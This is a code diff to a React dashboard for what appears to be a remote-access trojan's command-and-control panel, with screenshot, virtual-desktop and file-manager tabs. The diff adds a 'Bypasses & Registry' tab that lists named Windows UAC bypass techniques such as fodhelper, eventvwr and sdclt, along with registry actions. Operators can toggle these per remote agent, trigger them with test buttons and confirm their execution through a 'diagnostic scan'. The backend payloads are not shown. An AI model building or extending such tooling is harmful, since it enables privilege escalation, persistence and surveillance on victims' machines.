@@ -4,12 +4,15 @@ import { AgentCard } from "./components/AgentCard";
 import { StreamViewer } from "./components/StreamViewer";
 import { CommandPanel } from "./components/CommandPanel";
 import { SystemMonitor } from "./components/SystemMonitor";
+import { HardwareInventory } from "./components/HardwareInventory";
+import { ScreenshotTab } from "./components/ScreenshotTab";
 import { FileManager } from "./components/FileManager";
 import { Header } from "./components/Header";
 import { Sidebar } from "./components/Sidebar";
 import { SearchAndFilter } from "./components/SearchAndFilter";
 import { ActivityFeed } from "./components/ActivityFeed";
- import { QuickActions } from "./components/QuickActions";
+import { UpdateClientPanel } from "./components/UpdateClientPanel";
+import { QuickActions } from "./components/QuickActions";
 import ToggleControlPanel from "./components/ToggleControlPanel";
  const SettingsLazy = lazy(() =>
    import("./components/Settings").then((mod) => ({ default: mod.Settings }))
@@ -29,13 +32,14 @@ import ToggleControlPanel from "./components/ToggleControlPanel";
 import { ThemeProvider } from "./components/ThemeProvider";
 import { ErrorBoundary } from "./components/ErrorBoundary";
 import { Login } from "./components/Login";
-import { Toaster } from "./components/ui/sonner";
+import { Toaster, toast } from "./components/ui/sonner";
 import {
   Tabs,
   TabsContent,
   TabsList,
   TabsTrigger,
 } from "./components/ui/tabs";
+import { apiClient } from "./services/api";
 import {
   Card,
   CardContent,
@@ -46,8 +50,40 @@ import {
 import { Badge } from "./components/ui/badge";
 import { Button } from "./components/ui/button";
 import { Switch } from "./components/ui/switch";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "./components/ui/select";
 import { Label } from "./components/ui/label";
 import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+  DialogTrigger,
+  DialogFooter,
+} from "./components/ui/dialog";
+import {
+  Table,
+  TableBody,
+  TableCell,
+  TableHead,
+  TableHeader,
+  TableRow,
+} from "./components/ui/table";
+import { Progress } from "./components/ui/progress";
+import { 
+  AlertCircle, 
+  CheckCircle2, 
+  Circle, 
+  HelpCircle, 
+  ShieldAlert, 
+  Play, 
+  Zap,
   Shield,
   Monitor,
   Terminal,
@@ -55,7 +91,7 @@ import {
   Activity,
   Settings as SettingsIcon,
   Users,
-  Wifi,
+  Wifi
 } from "lucide-react";
 
 interface Agent {
@@ -71,6 +107,7 @@ interface Agent {
     memory: number;
     network: number;
   };
+  is_admin?: boolean;
 }
 
 type FilterOptions = {
@@ -96,6 +133,32 @@ function AppContent() {
     commandsExecutedCount: number;
   };
   const [activeTab, setActiveTab] = useState("overview");
+  const [bypassData, setBypassData] = useState<{ methods: Array<{key: string; enabled: boolean}>, sequence: Array<{id: number; name: string}> } | null>(null);
+  const [registryData, setRegistryData] = useState<{ actions: Array<{key: string; enabled: boolean}> } | null>(null);
+  const [globalBypassesEnabled, setGlobalBypassesEnabled] = useState(false);
+  const [globalRegistryEnabled, setGlobalRegistryEnabled] = useState(false);
+  const [targetAgentId, setTargetAgentId] = useState<string | null>(null);
+  const [agentAdminStatus, setAgentAdminStatus] = useState<Record<string, boolean>>({});
+  const api = apiClient;
+
+  // System Scan State
+  const [isScanning, setIsScanning] = useState(false);
+  const [scanProgress, setScanProgress] = useState(0);
+  const [scanResults, setScanResults] = useState<{
+    type: 'bypass' | 'registry';
+    name: string;
+    key: string;
+    enabled: boolean;
+    status: 'verified' | 'toggle_only' | 'error' | 'missing' | 'unknown';
+    message: string;
+    details?: string;
+  }[]>([]);
+  const [isScanDialogOpen, setIsScanDialogOpen] = useState(false);
+  
+  // Helper function to format registry key names
+  const fmt = (k: string) =>
+    k.replace(/_/g, ' ')
+      .replace(/\b\w/g, (c) => c.toUpperCase());
   const [agents, setAgents] = useState<Agent[]>(liveAgents as Agent[]);
   const networkActivity = (() => {
     try {
@@ -112,9 +175,176 @@ function AppContent() {
     }
   })();
 
+  const handleSystemScan = async () => {
+    setIsScanning(true);
+    setScanProgress(0);
+    setScanResults([]);
+    setIsScanDialogOpen(true);
+    
+    try {
+      // 1. Fetch latest data
+      const bypassesRes = await api.getBypasses();
+      const registryRes = await api.getRegistry();
+      
+      const bypasses = bypassesRes.success ? (bypassesRes.data as any).methods || [] : [];
+      const registry = registryRes.success ? (registryRes.data as any).actions || [] : [];
+      
+      const totalItems = bypasses.length + registry.length;
+      let processed = 0;
+      const results: typeof scanResults = [];
+
+      // 2. Scan Bypasses
+      for (const bypass of bypasses) {
+        let status: any = 'unknown';
+        let message = '';
+        let details = '';
+        
+        try {
+            const testRes = await api.testBypass(bypass.key);
+            
+            if (testRes.success) {
+                const result = (testRes.data as any)?.result;
+                if (result?.executed) {
+                    status = 'verified';
+                    message = 'Successfully executed and verified';
+                } else {
+                    status = 'toggle_only';
+                    message = 'Toggle switch only - No active execution detected';
+                }
+            } else {
+                status = 'error';
+                message = testRes.error || 'Execution check failed';
+            }
+        } catch (e) {
+            status = 'error';
+            message = 'Connection error during verification';
+        }
+
+        const nameMap: Record<string, string> = {
+            cleanmgr_sagerun: 'Cleanmgr.exe /SAGERUN',
+            fodhelper: 'Fodhelper ms-settings',
+            computerdefaults: 'ComputerDefaults',
+            eventvwr: 'EventVwr.exe hijacking',
+            sdclt: 'sdclt.exe bypass',
+            wsreset: 'WSReset.exe bypass',
+            slui: 'slui.exe hijacking',
+            winsat: 'winsat.exe bypass',
+            silentcleanup: 'SilentCleanup task',
+            icmluautil: 'ICMLuaUtil COM',
+            runas_prompt: 'RunAs Admin Prompt'
+        };
+
+        results.push({
+            type: 'bypass',
+            name: nameMap[bypass.key] || bypass.key,
+            key: bypass.key,
+            enabled: bypass.enabled,
+            status,
+            message,
+            details
+        });
+        
+        processed++;
+        setScanProgress(Math.round((processed / totalItems) * 100));
+        setScanResults([...results]);
+        await new Promise(r => setTimeout(r, 100));
+      }
+
+      // 3. Scan Registry
+      for (const reg of registry) {
+        let status: any = 'unknown';
+        let message = '';
+        let details = '';
+        
+        try {
+            const presenceRes = await api.checkRegistryPresence(reg.key);
+            const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
+            const path = (presenceRes.data as any)?.result?.path;
+            
+            const testRes = await api.testRegistry(reg.key);
+            
+            if (testRes.success) {
+                const result = (testRes.data as any)?.result;
+                if (result?.executed) {
+                    status = 'verified';
+                    message = isPresent ? 'Verified present and executable' : 'Executable (Key currently missing)';
+                    details = path ? `Path: ${path}` : '';
+                } else if (result?.need_admin) {
+                     status = 'error';
+                     message = 'Requires Admin privileges';
+                } else {
+                    status = 'toggle_only';
+                    message = 'Toggle switch only - No active execution detected';
+                }
+            } else {
+                status = 'error';
+                message = testRes.error || 'Execution check failed';
+            }
+            
+        } catch (e) {
+            status = 'error';
+            message = 'Connection error during verification';
+        }
+
+        results.push({
+            type: 'registry',
+            name: fmt(reg.key),
+            key: reg.key,
+            enabled: reg.enabled,
+            status,
+            message,
+            details
+        });
+
+        processed++;
+        setScanProgress(Math.round((processed / totalItems) * 100));
+        setScanResults([...results]);
+        await new Promise(r => setTimeout(r, 100));
+      }
+      
+    } catch (error) {
+        console.error('Scan failed', error);
+        toast.error('Diagnostic scan failed to start');
+    } finally {
+        setIsScanning(false);
+    }
+  };
+
   useEffect(() => {
     setAgents(liveAgents);
   }, [liveAgents]);
+  useEffect(() => {
+    (async () => {
+      if (activeTab === 'security') {
+        const b = await api.getBypasses();
+        const r = await api.getRegistry();
+        if (b.success) {
+          setBypassData(b.data as any);
+        }
+        if (r.success) {
+          setRegistryData(r.data as any);
+        }
+      }
+    })();
+  }, [activeTab]);
+
+  useEffect(() => {
+    (async () => {
+      if (targetAgentId) {
+        try {
+          // Fetch current admin status for the selected agent
+          // For now, we'll check the local state or assume false initially
+          // In the future, we could add an endpoint to fetch current admin status
+          if (!(targetAgentId in agentAdminStatus)) {
+            // Initialize with false if not set
+            setAgentAdminStatus(prev => ({ ...prev, [targetAgentId]: false }));
+          }
+        } catch (error) {
+          console.error('Error fetching admin status:', error);
+        }
+      }
+    })();
+  }, [targetAgentId]);
   const [searchTerm, setSearchTerm] = useState("");
   const [filters, setFilters] = useState<FilterOptions>({
     status: [],
@@ -361,7 +591,7 @@ function AppContent() {
                 onValueChange={setActiveTab}
                 className="space-y-6"
               >
-                <TabsList className="grid w-full h-auto grid-cols-3 sm:grid-cols-9">
+                <TabsList className="grid w-full h-auto grid-cols-3 sm:grid-cols-10">
                   <TabsTrigger value="overview" className="text-xs sm:text-sm">
                     Overview
                   </TabsTrigger>
@@ -374,8 +604,17 @@ function AppContent() {
                   <TabsTrigger value="streaming" className="text-xs sm:text-sm">
                     Streaming
                   </TabsTrigger>
+                  <TabsTrigger value="screenshot" className="text-xs sm:text-sm">
+                    Screenshot
+                  </TabsTrigger>
+                  <TabsTrigger value="hardware" className="text-xs sm:text-sm">
+                    Hardware
+                  </TabsTrigger>
                   <TabsTrigger value="virtual" className="text-xs sm:text-sm">
                     Virtual Desktop
+                  </TabsTrigger>
+                  <TabsTrigger value="security" className="text-xs sm:text-sm">
+                    Bypasses & Registry
                   </TabsTrigger>
                   <TabsTrigger value="commands" className="text-xs sm:text-sm">
                     Commands
@@ -493,6 +732,515 @@ function AppContent() {
                       </div>
                     </CardContent>
                   </Card>
+                </TabsContent>
+                
+                <TabsContent value="security" className="space-y-6">
+                  <div className="mb-4 flex items-center gap-4">
+                    <div>
+                      <label className="text-sm font-medium mr-2">Target Agent</label>
+                      <Select
+                        value={targetAgentId || 'global'}
+                        onValueChange={(value) => setTargetAgentId(value === 'global' ? null : value)}
+                      >
+                        <SelectTrigger className="w-[300px]">
+                          <SelectValue placeholder="Select target agent" />
+                        </SelectTrigger>
+                        <SelectContent>
+                          <SelectItem value="global">Global</SelectItem>
+                          {onlineAgents.map((agent) => (
+                            <SelectItem key={agent.id} value={agent.id}>
+                              {agent.name} ({agent.ip})
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+                    {targetAgentId && (
+                      <div>
+                        <label className="text-sm font-medium mr-2">Admin Status</label>
+                        <Button
+                          variant={agentAdminStatus[targetAgentId] ? "default" : "outline"}
+                          size="sm"
+                          onClick={async () => {
+                            try {
+                              const newStatus = !agentAdminStatus[targetAgentId];
+                              const res = await api.setAgentAdminStatus(targetAgentId, newStatus);
+                              if (res.success) {
+                                setAgentAdminStatus(prev => ({ ...prev, [targetAgentId]: newStatus }));
+                                toast.success(`Agent ${targetAgentId.slice(0,8)} admin status ${newStatus ? 'enabled' : 'disabled'}`);
+                              } else {
+                                const errorMsg = res.error || 'Failed to update admin status';
+                                toast.error(errorMsg);
+                              }
+                            } catch (error) {
+                              console.error('Error updating admin status:', error);
+                              toast.error('Failed to update admin status');
+                            }
+                          }}
+                        >
+                          {agentAdminStatus[targetAgentId] ? "Admin ✓" : "Set Admin"}
+                        </Button>
+                      </div>
+                    )}
+                  </div>
+                  
+                  <Card className="mb-6 border-primary/20 bg-primary/5">
+                    <CardHeader className="pb-3">
+                        <div className="flex items-center justify-between">
+                            <div className="flex items-center gap-2">
+                                <Activity className="h-5 w-5 text-primary" />
+                                <div>
+                                    <CardTitle>System Diagnostic Scan</CardTitle>
+                                    <CardDescription>Comprehensive scan of all bypass and registry components</CardDescription>
+                                </div>
+                            </div>
+                            <Button onClick={handleSystemScan} disabled={isScanning}>
+                                {isScanning ? (
+                                <>
+                                    <Activity className="mr-2 h-4 w-4 animate-pulse" />
+                                    Scanning... {scanProgress}%
+                                </>
+                                ) : (
+                                <>
+                                    <Play className="mr-2 h-4 w-4" />
+                                    Run Full Scan
+                                </>
+                                )}
+                            </Button>
+                        </div>
+                    </CardHeader>
+                  </Card>
+
+                  <Card>
+                    <CardHeader>
+                      <CardTitle>Bypasses</CardTitle>
+                      <CardDescription>Parsed from agent client configuration</CardDescription>
+                    </CardHeader>
+                <CardContent>
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <div className="flex items-center justify-between mb-3">
+                        <span className="text-sm font-medium">Global Bypasses</span>
+                        <Switch
+                          checked={globalBypassesEnabled}
+                          onCheckedChange={async (checked) => {
+                            const res = targetAgentId ? await api.setAgentGlobal(targetAgentId, checked, undefined) : await api.setBypassesGlobal(checked);
+                            if (res.success) {
+                              setGlobalBypassesEnabled(checked);
+                              if (targetAgentId) {
+                                const s = await api.getAgentSecurity(targetAgentId);
+                                if (s.success) {
+                                  const d = s.data as any;
+                                  setBypassData({ methods: d.methods || [], sequence: (bypassData?.sequence || []) });
+                                }
+                              } else {
+                                const b = await api.getBypasses();
+                                if (b.success) setBypassData(b.data as any);
+                              }
+                              toast.success(`Bypasses ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : 'globally'}`);
+                            } else {
+                              const errorMsg = res.error || 'Failed to update global bypasses';
+                              if (res.message?.includes('admin')) {
+                                toast.error('Admin privileges required', { 
+                                  description: 'Cannot modify bypasses without admin access. Please ensure the agent has admin privileges.' 
+                                });
+                              } else {
+                                toast.error(errorMsg);
+                              }
+                            }
+                          }}
+                        />
+                      </div>
+                      <div className="text-sm font-medium mb-2">UAC Methods</div>
+                      <div className="space-y-1">
+                        {(() => {
+                          const nameMap: Record<string, string> = {
+                                cleanmgr_sagerun: 'Cleanmgr.exe /SAGERUN scheduled task',
+                                fodhelper: 'Fodhelper ms-settings protocol',
+                                computerdefaults: 'ComputerDefaults ms-settings protocol',
+                                eventvwr: 'EventVwr.exe registry hijacking',
+                                sdclt: 'sdclt.exe bypass',
+                                wsreset: 'WSReset.exe bypass',
+                                slui: 'slui.exe registry hijacking',
+                                winsat: 'winsat.exe bypass',
+                                silentcleanup: 'SilentCleanup scheduled task',
+                                icmluautil: 'ICMLuaUtil COM interface',
+                                runas_prompt: 'RunAs persistent admin prompt'
+                              };
+                          return (bypassData?.methods || []).map((m) => (
+                            <div key={m.key} className="flex items-center justify-between text-sm">
+                              <span>{nameMap[m.key] || m.key}</span>
+                              <div className="flex items-center gap-2">
+                                <Badge variant={m.enabled ? 'default' : 'secondary'}>
+                                  {m.enabled ? 'Enabled' : 'Disabled'}
+                                </Badge>
+                                <Switch
+                                  checked={m.enabled}
+                                  onCheckedChange={async (checked) => {
+                                    const res = targetAgentId ? await api.toggleAgentBypass(targetAgentId!, m.key, checked) : await api.toggleBypass(m.key, checked);
+                                    if (res.success) {
+                                      const d = res.data as any;
+                                      setBypassData((prev) => ({ ...(prev || { methods: [], sequence: [] }), methods: d.methods || [] }));
+                                      toast.success(`${m.key} ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : ''}`);
+                                    } else {
+                                      const errorMsg = res.error || 'Failed to update bypass';
+                                      if (res.message?.includes('admin')) {
+                                        toast.error('Admin privileges required', { 
+                                          description: 'Cannot modify bypass without admin access. Please ensure the agent has admin privileges.' 
+                                        });
+                                      } else {
+                                        toast.error(errorMsg);
+                                      }
+                                    }
+                                  }}
+                                />
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  onClick={async () => {
+                                    const res = await api.testBypass(m.key);
+                                    const ok = res.success && (res.data as any)?.result?.executed;
+                                    const name = nameMap[m.key] || m.key;
+                                    
+                                    if (ok) {
+                                      toast.success(`✅ Successfully executed bypass: ${name}`, {
+                                        description: `The bypass method has been successfully applied to the agent.`
+                                      });
+                                    } else {
+                                      toast.warning(`⚠️ Failed to execute bypass: ${name}`, {
+                                        description: 'The bypass method could not be executed. This may be due to system restrictions or the bypass is not applicable in the current environment.'
+                                      });
+                                    }
+                                  }}
+                                >
+                                  Test
+                                </Button>
+                              </div>
+                            </div>
+                          ));
+                        })()}
+                      </div>
+                    </div>
+                    <div>
+                      <div className="flex items-center justify-between mb-3">
+                        <span className="text-sm font-medium">Global Registry</span>
+                        <Switch
+                          checked={globalRegistryEnabled}
+                          onCheckedChange={async (checked) => {
+                            const res = targetAgentId ? await api.setAgentGlobal(targetAgentId, undefined, checked) : await api.setRegistryGlobal(checked);
+                            if (res.success) {
+                              setGlobalRegistryEnabled(checked);
+                              if (targetAgentId) {
+                                const s = await api.getAgentSecurity(targetAgentId);
+                                if (s.success) {
+                                  const d = s.data as any;
+                                  setRegistryData({ actions: d.actions || [] });
+                                }
+                              } else {
+                                const r = await api.getRegistry();
+                                if (r.success) setRegistryData(r.data as any);
+                              }
+                              toast.success(`Registry ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : 'globally'}`);
+                            } else {
+                              const errorMsg = res.error || 'Failed to update global registry';
+                              if (res.message?.includes('admin')) {
+                                toast.error('Admin privileges required', { 
+                                  description: 'Cannot modify registry without admin access. Please ensure the agent has admin privileges.' 
+                                });
+                              } else {
+                                toast.error(errorMsg);
+                              }
+                            }
+                          }}
+                        />
+                      </div>
+                      <div className="text-sm font-medium mb-2">Sequence</div>
+                      <div className="space-y-1">
+                        {(bypassData?.sequence || []).map((s) => (
+                          <div key={s.id} className="flex items-center justify-between text-sm">
+                            <span>{s.name}</span>
+                            <Badge variant="secondary">#{s.id}</Badge>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+              <Card>
+                <CardHeader>
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <CardTitle>Registry Actions</CardTitle>
+                      <CardDescription>Parsed from agent client configuration</CardDescription>
+                    </div>
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={async () => {
+                        if (!registryData?.actions?.length) {
+                          toast.warning('No registry actions available');
+                          return;
+                        }
+
+                        const enabledActions = registryData.actions.filter(a => a.enabled);
+                        if (enabledActions.length === 0) {
+                          toast.warning('No registry actions are enabled');
+                          return;
+                        }
+
+                        toast.info('🔄 Testing all enabled registry actions...', {
+                          description: `Testing ${enabledActions.length} enabled registry actions`
+                        });
+
+                        const results = [];
+                        for (const action of enabledActions) {
+                          try {
+                            // First check presence
+                            const presenceRes = await api.checkRegistryPresence(action.key);
+                            const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
+                            const registryPath = (presenceRes.data as any)?.result?.path;
+                            const currentValue = (presenceRes.data as any)?.result?.value;
+                            
+                            // Then test the registry action
+                            const res = await api.testRegistry(action.key);
+                            const ok = res.success && (res.data as any)?.result?.executed;
+                            const needAdmin = (res.data as any)?.result?.need_admin;
+                            const name = fmt(action.key);
+                            
+                            results.push({
+                              name,
+                              key: action.key,
+                              success: ok,
+                              needAdmin: needAdmin,
+                              wasPresent: isPresent,
+                              error: !res.success ? res.error : null
+                            });
+
+                            // Individual notification for each test with presence info
+                            if (isPresent) {
+                              toast.info(`🔍 ${name} already exists`, {
+                                description: `Registry key found at: ${registryPath}${currentValue ? ` (Value: ${JSON.stringify(currentValue)})` : ''}`
+                              });
+                            } else {
+                              toast.warning(`🔍 ${name} not found`, {
+                                description: 'Registry key does not exist in the Windows Registry Editor'
+                              });
+                            }
+
+                            if (ok) {
+                              toast.success(`✅ ${name} test successful`, {
+                                description: 'Registry key created/updated successfully'
+                              });
+                            } else if (needAdmin) {
+                              toast.error(`❌ ${name} test failed`, {
+                                description: 'Admin privileges required'
+                              });
+                            } else {
+                              toast.warning(`⚠️ ${name} test failed`, {
+                                description: 'Operation skipped or failed'
+                              });
+                            }
+                          } catch (error) {
+                            console.error(`Error testing ${action.key}:`, error);
+                            results.push({
+                              name: fmt(action.key),
+                              key: action.key,
+                              success: false,
+                              needAdmin: false,
+                              wasPresent: false,
+                              error: 'Network error'
+                            });
+                            toast.error(`❌ ${fmt(action.key)}`, {
+                              description: 'Network error occurred'
+                            });
+                          }
+                        }
+
+                        // Summary notification
+                        const successful = results.filter(r => r.success).length;
+                        const failed = results.filter(r => !r.success).length;
+                        const adminRequired = results.filter(r => r.needAdmin).length;
+
+                        if (successful === results.length) {
+                          toast.success('🎉 All registry tests completed successfully!', {
+                            description: `${successful}/${results.length} registry actions tested successfully`
+                          });
+                        } else {
+                          toast.warning('⚠️ Registry tests completed with issues', {
+                            description: `${successful} succeeded, ${failed} failed (${adminRequired} need admin)`
+                          });
+                        }
+                      }}
+                      disabled={!registryData?.actions?.some(a => a.enabled)}
+                    >
+                      Test All Enabled
+                    </Button>
+                  </div>
+                </CardHeader>
+                <CardContent>
+                  <div className="space-y-1">
+                        {(registryData?.actions || []).map((a) => (
+                        <div key={a.key} className="flex items-center justify-between text-sm">
+                          <span>{fmt(a.key)}</span>
+                          <div className="flex items-center gap-2">
+                            <Badge variant={a.enabled ? 'default' : 'secondary'}>
+                              {a.enabled ? 'Enabled' : 'Disabled'}
+                            </Badge>
+                            <Switch
+                              checked={a.enabled}
+                              onCheckedChange={async (checked) => {
+                                const res = targetAgentId ? await api.toggleAgentRegistry(targetAgentId!, a.key, checked) : await api.toggleRegistry(a.key, checked);
+                                if (res.success) {
+                                  const d = res.data as any;
+                                  setRegistryData((prev) => ({ ...(prev || { actions: [] }), actions: d.actions || [] }));
+                                  toast.success(`${a.key} ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : ''}`);
+                                } else {
+                                  const errorMsg = res.error || 'Failed to update registry';
+                                  if (res.message?.includes('admin')) {
+                                    toast.error('Admin privileges required', { 
+                                      description: 'Cannot modify registry without admin access. Please ensure the agent has admin privileges.' 
+                                    });
+                                  } else {
+                                    toast.error(errorMsg);
+                                  }
+                                }
+                              }}
+                            />
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              onClick={async () => {
+                                const name = fmt(a.key);
+                                
+                                // First check if registry key is present
+                                try {
+                                  const presenceRes = await api.checkRegistryPresence(a.key);
+                                  const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
+                                  const registryPath = (presenceRes.data as any)?.result?.path;
+                                  const currentValue = (presenceRes.data as any)?.result?.value;
+                                  
+                                  if (isPresent) {
+                                    toast.info(`🔍 ${name} already exists`, {
+                                      description: `Registry key found at: ${registryPath}${currentValue ? ` (Value: ${JSON.stringify(currentValue)})` : ''}`
+                                    });
+                                  } else {
+                                    toast.warning(`🔍 ${name} not found`, {
+                                      description: 'Registry key does not exist in the Windows Registry Editor'
+                                    });
+                                  }
+                                } catch (presenceError) {
+                                  console.error('Error checking registry presence:', presenceError);
+                                  toast.error(`❌ Failed to check ${name} presence`, {
+                                    description: 'Unable to verify if registry key exists'
+                                  });
+                                }
+                                
+                                // Then proceed with the actual test
+                                const res = await api.testRegistry(a.key);
+                                const ok = res.success && (res.data as any)?.result?.executed;
+                                const needAdmin = (res.data as any)?.result?.need_admin;
+                                
+                                if (ok) {
+                                  toast.success(`✅ Successfully added ${name} to registry`, {
+                                    description: `Registry key has been created/updated successfully in the agent's registry editor.`
+                                  });
+                                } else if (needAdmin) {
+                                  toast.error(`❌ Failed to add ${name}`, {
+                                    description: 'Administrator privileges are required for this operation. The agent needs admin access to modify this registry key.'
+                                  });
+                                } else {
+                                  toast.warning(`⚠️ Failed to add ${name}`, {
+                                    description: 'Operation was skipped or returned failure status. The registry key may already exist or the action is not applicable.'
+                                  });
+                                }
+                              }}
+                            >
+                              Test
+                            </Button>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                </CardContent>
+              </Card>
+
+              <Dialog open={isScanDialogOpen} onOpenChange={setIsScanDialogOpen}>
+                <DialogContent className="max-w-4xl max-h-[80vh] overflow-hidden flex flex-col">
+                  <DialogHeader>
+                    <DialogTitle>System Diagnostic Report</DialogTitle>
+                    <DialogDescription>
+                      Analysis of bypass mechanisms and registry entries connectivity and execution status.
+                    </DialogDescription>
+                  </DialogHeader>
+                  
+                  <div className="flex items-center gap-4 py-4">
+                    <div className="flex-1 space-y-1">
+                      <div className="flex justify-between text-sm text-muted-foreground">
+                        <span>Progress</span>
+                        <span>{scanProgress}%</span>
+                      </div>
+                      <Progress value={scanProgress} />
+                    </div>
+                  </div>
+
+                  <div className="flex-1 overflow-auto border rounded-md">
+                    <Table>
+                      <TableHeader>
+                        <TableRow>
+                          <TableHead>Component</TableHead>
+                          <TableHead>Type</TableHead>
+                          <TableHead>State</TableHead>
+                          <TableHead>Status</TableHead>
+                          <TableHead>Details</TableHead>
+                        </TableRow>
+                      </TableHeader>
+                      <TableBody>
+                        {scanResults.map((result, i) => (
+                          <TableRow key={i}>
+                            <TableCell className="font-medium">{result.name}</TableCell>
+                            <TableCell>
+                              <Badge variant="outline" className={result.type === 'bypass' ? 'border-blue-500 text-blue-500' : 'border-purple-500 text-purple-500'}>
+                                {result.type.toUpperCase()}
+                              </Badge>
+                            </TableCell>
+                            <TableCell>
+                              <Badge variant={result.enabled ? 'default' : 'secondary'}>
+                                {result.enabled ? 'Enabled' : 'Disabled'}
+                              </Badge>
+                            </TableCell>
+                            <TableCell>
+                                <div className="flex items-center gap-2">
+                                    {result.status === 'verified' && <CheckCircle2 className="h-4 w-4 text-green-500" />}
+                                    {result.status === 'toggle_only' && <Circle className="h-4 w-4 text-yellow-500" />}
+                                    {result.status === 'error' && <ShieldAlert className="h-4 w-4 text-red-500" />}
+                                    {result.status === 'missing' && <AlertCircle className="h-4 w-4 text-orange-500" />}
+                                    <span className={
+                                        result.status === 'verified' ? 'text-green-500' :
+                                        result.status === 'toggle_only' ? 'text-yellow-500' :
+                                        result.status === 'error' ? 'text-red-500' : ''
+                                    }>
+                                        {result.message}
+                                    </span>
+                                </div>
+                            </TableCell>
+                            <TableCell className="text-muted-foreground text-xs font-mono">
+                                {result.details}
+                            </TableCell>
+                          </TableRow>
+                        ))}
+                        {scanResults.length === 0 && !isScanning && (
+                            <TableRow>
+                                <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">
+                                    Click "Run Full Scan" to start diagnostics
+                                </TableCell>
+                            </TableRow>
+                        )}
+                      </TableBody>
+                    </Table>
+                  </div>
+                </DialogContent>
+              </Dialog>
                 </TabsContent>
                 
                 <TabsContent
@@ -652,6 +1400,14 @@ function AppContent() {
                   </div>
                 </TabsContent>
 
+                <TabsContent value="screenshot" className="space-y-6">
+                  <ScreenshotTab agentId={selectedAgent} />
+                </TabsContent>
+
+                <TabsContent value="hardware" className="space-y-6">
+                  <HardwareInventory agentId={selectedAgent} />
+                </TabsContent>
+
                 <TabsContent value="virtual" className="space-y-6">
                   <VirtualDesktop agentId={selectedAgent} />
                 </TabsContent>
@@ -726,7 +1482,9 @@ function AppContent() {
                   <FileManager agentId={selectedAgent} />
                 </TabsContent>
 
-                
+                <TabsContent value="update_client" className="space-y-6">
+                  <UpdateClientPanel />
+                </TabsContent>
 
                 <TabsContent
                   value="monitoring"
